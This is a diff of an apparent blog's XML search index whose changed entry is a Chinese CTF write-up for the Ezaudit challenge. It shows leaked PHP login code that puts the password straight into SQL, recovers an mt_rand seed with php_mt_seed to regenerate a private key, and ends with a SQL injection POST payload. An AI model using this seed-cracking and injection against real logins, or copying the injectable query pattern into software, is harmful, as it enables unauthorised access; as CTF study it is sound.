@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[BUUCTF-WEB [MRCTF2020]Ezaudit 1]]></title>
     <url>%2F2021%2F10%2F28%2F%5BMRCTF2020%5DEzaudit%201%2F</url>
-    <content type="text"><![CDATA[考点文件泄露 mt_srand伪随机数构造 sql注入 解题过程打开 扫目录扫到www.zip，压缩包中有一个index.php文件，代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php header(&apos;Content-type:text/html; charset=utf-8&apos;);error_reporting(0);if(isset($_POST[&apos;login&apos;]))&#123; $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; $Private_key = $_POST[&apos;Private_key&apos;]; if (($username == &apos;&apos;) || ($password == &apos;&apos;) ||($Private_key == &apos;&apos;)) &#123; // 若为空,视为未填写,提示错误,并3秒后返回登录界面 header(&apos;refresh:2; url=login.html&apos;); echo &quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;; exit;&#125; // KVQP0LdJKRaV else if($Private_key != &apos;*************&apos; ) &#123; header(&apos;refresh:2; url=login.html&apos;); echo &quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;; exit; &#125; else&#123; if($Private_key === &apos;************&apos;)&#123; $getuser = &quot;SELECT flag FROM user WHERE username= &apos;crispr&apos; AND password = &apos;$password&apos;&quot;.&apos;;&apos;; // $getuser = &quot;SELECT flag FROM user WHERE username= &apos;crispr&apos; AND password = &apos;1&apos;or &apos;1&apos;&quot;.&apos;;&apos;; $link=mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;); mysql_select_db(&quot;test&quot;,$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo &quot;&lt;tr&gt;&lt;td&gt;&quot;.$row[&quot;username&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;.$row[&quot;flag&quot;].&quot;&lt;/td&gt;&lt;td&gt;&quot;; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;; $public_key = &apos;&apos;; for ( $i = 0; $i &lt; $length; $i++ ) // mt_srand(xxx); 1775196155 // 这里的mt_rand会根据mt_srand设置的随机数种子来生成随机数 // 如果我们知道了 xxx 我们就掌握了随机数的生成规律 $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; // 返回结果：KVQP0LdJKRaV3n9D // 这里通过返回结果反推出随机数 &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&apos;; $private_key = &apos;&apos;; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr&apos;s private_key??? 将公钥转换成随机数生成的数字12345678910111213import requestsimport randomdict1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'dict2='KVQP0LdJKRaV3n9D'dict3 = dict1[::-1] length = len(dict2) res=''for i in range(len(dict2)): for j in range(len(dict1)): if dict2[i] == dict1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(dict1)-1)+' ' breakprint(res) 得到 136 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 通过php_mt_seed爆破出随机数种子 得到 11775196155 设置mt_srand值为17751961551234567891011121314151617181920212223&lt;?phpmt_srand(1775196155);function public_key($length = 16) &#123; $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) // mt_srand(xxx); 1775196155 // 这里的mt_rand会根据mt_srand设置的随机数种子来生成随机数 // 如果我们知道了 xxx 我们就掌握了随机数的生成规律 $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; // 返回结果：KVQP0LdJKRaV3n9D // 这里通过返回结果反推出随机数&#125;function private_key($length = 12) &#123; $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;&#125;echo public_key()."\n";echo private_key(); 得到 12KVQP0LdJKRaV3n9DXuNhoueCDCGc 拿到了Private_key，接下来就是提交 123"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';';"SELECT flag FROM user WHERE username= 'crispr' AND password = '1'or '1'".';'; // 绕过即可 post 1login=123&amp;username=aaa&amp;password=1&apos; or &apos;1&amp;Private_key=XuNhoueCDCGc 总结老考点，不是很难。]]></content>
+    <content type="text"><![CDATA[考点文件泄露 mt_srand伪随机数构造 sql注入 解题过程打开 扫目录扫到www.zip，压缩包中有一个index.php文件，代码如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?php header('Content-type:text/html; charset=utf-8');error_reporting(0);if(isset($_POST['login']))&#123; $username = $_POST['username']; $password = $_POST['password']; $Private_key = $_POST['Private_key']; if (($username == '') || ($password == '') ||($Private_key == '')) &#123; // 若为空,视为未填写,提示错误,并3秒后返回登录界面 header('refresh:2; url=login.html'); echo "用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"; exit;&#125; // KVQP0LdJKRaV else if($Private_key != '*************' ) &#123; header('refresh:2; url=login.html'); echo "假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"; exit; &#125; else&#123; if($Private_key === '************')&#123; $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';'; // $getuser = "SELECT flag FROM user WHERE username= 'crispr' AND password = '1'or '1'".';'; $link=mysql_connect("localhost","root","root"); mysql_select_db("test",$link); $result = mysql_query($getuser); while($row=mysql_fetch_assoc($result))&#123; echo "&lt;tr&gt;&lt;td&gt;".$row["username"]."&lt;/td&gt;&lt;td&gt;".$row["flag"]."&lt;/td&gt;&lt;td&gt;"; &#125; &#125; &#125;&#125; // genarate public_key function public_key($length = 16) &#123; $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) // mt_srand(xxx); 1775196155 // 这里的mt_rand会根据mt_srand设置的随机数种子来生成随机数 // 如果我们知道了 xxx 我们就掌握了随机数的生成规律 $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; // 返回结果：KVQP0LdJKRaV3n9D // 这里通过返回结果反推出随机数 &#125; //genarate private_key function private_key($length = 12) &#123; $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; &#125; $Public_key = public_key(); //$Public_key = KVQP0LdJKRaV3n9D how to get crispr's private_key??? 将公钥转换成随机数生成的数字12345678910111213import requestsimport randomdict1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'dict2='KVQP0LdJKRaV3n9D'dict3 = dict1[::-1] length = len(dict2) res=''for i in range(len(dict2)): for j in range(len(dict1)): if dict2[i] == dict1[j]: res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(dict1)-1)+' ' breakprint(res) 得到 136 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61 通过php_mt_seed爆破出随机数种子 得到 11775196155 设置mt_srand值为17751961551234567891011121314151617181920212223&lt;?phpmt_srand(1775196155);function public_key($length = 16) &#123; $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) // mt_srand(xxx); 1775196155 // 这里的mt_rand会根据mt_srand设置的随机数种子来生成随机数 // 如果我们知道了 xxx 我们就掌握了随机数的生成规律 $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; // 返回结果：KVQP0LdJKRaV3n9D // 这里通过返回结果反推出随机数&#125;function private_key($length = 12) &#123; $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i &lt; $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key;&#125;echo public_key()."\n";echo private_key(); 得到 12KVQP0LdJKRaV3n9DXuNhoueCDCGc 拿到了Private_key，接下来就是提交 123"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'".';';"SELECT flag FROM user WHERE username= 'crispr' AND password = '1'or '1'".';'; // 绕过即可 post 1login=123&amp;username=aaa&amp;password=1&apos; or &apos;1&amp;Private_key=XuNhoueCDCGc 总结老考点，不是很难。]]></content>
       <categories>
         <category>BUUCTF</category>
       </categories>
@@ -121,8 +121,8 @@
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>CTF</tag>
+        <tag>反序列化</tag>
         <tag>备份文件泄露</tag>
       </tags>
   </entry>
@@ -235,8 +235,8 @@
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>CTF</tag>
+        <tag>反序列化</tag>
         <tag>代码审计</tag>
       </tags>
   </entry>
@@ -339,8 +339,8 @@
         <category>Bugku</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>CTF</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -478,8 +478,8 @@
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>CTF</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -514,8 +514,8 @@
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>CTF</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -538,8 +538,8 @@
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>CTF</tag>
+        <tag>反序列化</tag>
         <tag>代码执行</tag>
       </tags>
   </entry>
@@ -614,8 +614,8 @@
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>CTF</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -626,8 +626,8 @@
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>CTF</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
@@ -662,8 +662,8 @@
         <category>BUUCTF</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>CTF</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
